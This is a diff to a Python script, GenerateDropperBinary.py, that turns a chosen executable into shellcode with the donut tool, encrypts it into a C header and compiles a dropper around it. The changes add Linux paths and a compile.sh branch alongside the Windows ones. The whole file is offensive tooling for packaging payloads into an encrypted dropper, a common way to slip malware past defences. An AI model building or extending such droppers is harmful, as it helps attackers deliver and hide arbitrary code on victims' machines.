@@ -1,5 +1,6 @@
 import sys, getopt
 from Crypto.Cipher import AES
+import os
 from os import urandom
 import hashlib
 import random
@@ -38,7 +39,7 @@ def xor(data, key):
 	return output_str
 
 def printCiphertext(ciphertext):
-	return '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' }'
+	return '{ (char)0x' + ', (char)0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' }'
 
 
 def main(argv):
@@ -46,7 +47,8 @@ def main(argv):
         fileClear = open('clearDef.h', 'r')
 
         if(len(argv)<3):
-                print ('GenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
+                print ('On Windows:\nGenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
+                print ('On linux:\nGenerateDropperBinary.py -b ./calc.exe -a "some args"')
                 exit()
 
         binary=""
@@ -55,7 +57,8 @@ def main(argv):
         opts, args = getopt.getopt(argv,"hb:a:",["binary=","args="])
         for opt, arg in opts:
                 if opt == '-h':
-                        print ('GenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
+                        print ('On Windows:\nGenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
+                        print ('On linux:\nGenerateDropperBinary.py -b ./calc.exe -a "some args"')
                         sys.exit()
                 elif opt in ("-b", "--binary"):
                         binary = arg
@@ -69,7 +72,10 @@ def main(argv):
 
         #dllArgs = '{} {} {}'.format(ip, port, listenerType)
 
-        args = ('.\\ressources\\donut.exe', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', '.\\dropper.bin', binary)
+        if os.name == 'nt':
+                args = ('.\\ressources\\donut.exe', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', '.\\dropper.bin', binary)
+        else:   
+                args = ('./ressources/donut', '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', './dropper.bin', binary)
         popen = subprocess.Popen(args, stdout=subprocess.PIPE)
         popen.wait()
         output = popen.stdout.read()
@@ -77,7 +83,7 @@ def main(argv):
         print("[+] Generate shellcode of payload with donut")
         print(output.decode("utf-8") )
 
-        shellcode = open(".\\dropper.bin", "rb").read()
+        shellcode = open("dropper.bin", "rb").read()
 
         Lines = fileClear.readlines()
 
@@ -127,7 +133,10 @@ def main(argv):
         fileEncrypt.close()
 
         print("[+] Compile dropper with shellcode")
-        args = ".\\compile.bat".split()
+        if os.name == 'nt':
+                args = ".\\compile.bat".split()
+        else:   
+                args = "./compile.sh".split()
         popen = subprocess.Popen(args, stdout=subprocess.PIPE)
         popen.wait()
         output = popen.stdout.read()
